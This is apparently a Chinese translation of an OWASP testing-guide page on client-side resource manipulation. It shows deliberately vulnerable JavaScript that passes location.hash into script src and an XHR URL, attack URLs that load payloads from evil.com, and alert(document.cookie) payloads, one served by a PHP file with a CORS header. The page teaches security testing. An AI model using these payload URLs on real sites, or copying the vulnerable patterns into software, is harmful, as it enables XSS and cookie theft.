# 测试客户端资源操纵

|ID          |
|------------|
|WSTG-CLNT-06|

## 概述

客户端资源操纵漏洞是一种输入验证缺陷。当应用程序接受用户控制的输入（用于指定资源路径，例如 iframe、JavaScript、小程序的源，或 XMLHttpRequest 的处理程序）时，就会发生此漏洞。该漏洞包括控制链接到网页中某些资源的 URL 的能力。此漏洞的影响各不相同，通常用于发起 XSS 攻击。此漏洞使得攻击者能够通过导致应用程序加载和呈现恶意对象来干扰其预期行为。

以下 JavaScript 代码显示了一个可能易受攻击的脚本，其中攻击者能够控制 `location.hash`（源），该值到达脚本元素的 `src` 属性。此特定情况会导致 XSS 攻击，因为可以注入外部 JavaScript。

```html
<script>
    var d=document.createElement("script");
    if(location.hash.slice(1)) {
        d.src = location.hash.slice(1);
    }
    document.body.appendChild(d);
</script>
```

攻击者可以通过诱使受害者访问以下 URL 来瞄准受害者：

`www.victim.com/#https://evil.com/js.js`

其中 `js.js` 包含：

```js
alert(document.cookie)
```

这将导致在受害者的浏览器上弹出警告框。

一个更具破坏性的场景涉及控制 CORS 请求中调用的 URL 的可能性。由于 CORS 允许目标资源通过基于头部的方法对请求域可访问，攻击者可以要求目标页面从其自己的网站加载恶意内容。

以下是一个易受攻击页面的示例：

```html
<b id="p"></b>
<script>
    function createCORSRequest(method, url) {
        var xhr = new XMLHttpRequest();
        xhr.open(method, url, true);
        xhr.onreadystatechange = function () {
            if (this.status == 200 && this.readyState == 4) {
                document.getElementById('p').innerHTML = this.responseText;
            }
        };
        return xhr;
    }

    var xhr = createCORSRequest('GET', location.hash.slice(1));
    xhr.send(null);
</script>
```

`location.hash` 由用户输入控制，并用于请求外部资源，然后通过 `innerHTML` 构造进行反射。攻击者可以诱使受害者访问以下 URL：

`www.victim.com/#https://evil.com/html.html`

其中 `html.html` 包含载荷处理程序：

```html
<?php
header('Access-Control-Allow-Origin: https://www.victim.com');
?>
<script>alert(document.cookie);</script>
```

## 测试目标

- 识别输入验证薄弱的接收器。
- 评估资源操纵的影响。

## 如何测试

要手动检查此类漏洞，我们必须确定应用程序是否使用了未经正确验证的输入。如果是这样，这些输入则由用户控制，并可用于指定外部资源。由于应用程序中可能包含许多资源（如图像、视频、对象、CSS 和 iframe），应调查处理相关 URL 的客户端脚本是否存在潜在问题。

下表显示了应检查的可能注入点（接收器）：

| 资源类型   | 标签/方法                                | 接收器   |
| --------------- | ----------------------------------------- | ------ |
| 框架           | iframe                                    | src    |
| 链接            | a                                         | href   |
| AJAX 请求    | `xhr.open(method, [url], true);` | URL    |
| CSS             | link                                      | href   |
| 图像           | img                                       | src    |
| 对象          | object                                    | data   |
| 脚本          | script                                    | src    |

最有趣的是那些允许攻击者包含客户端代码（例如 JavaScript）的注入点，这可能导致 XSS 漏洞。
